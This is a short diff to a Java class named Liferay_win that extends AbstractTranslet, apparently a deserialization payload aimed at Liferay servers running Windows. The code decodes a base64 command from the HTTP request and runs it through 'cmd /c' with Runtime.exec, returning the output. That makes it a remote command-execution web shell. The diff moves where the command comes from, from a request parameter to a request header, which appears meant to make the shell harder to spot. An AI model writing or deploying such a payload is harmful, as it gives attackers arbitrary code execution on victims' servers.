@@ -33,8 +33,8 @@ public class Liferay_win extends AbstractTranslet implements Serializable {
 
 
             // exexute shell to base64
-            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getParameter("c")));
-            // String params = httprequest.getParameter("c");
+            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getHeader("c")));
+            // String params = httprequest.getHeader("c");
             String[] command = {"cmd", "/c", params};
             InputStream in = Runtime.getRuntime().exec(command).getInputStream();
 
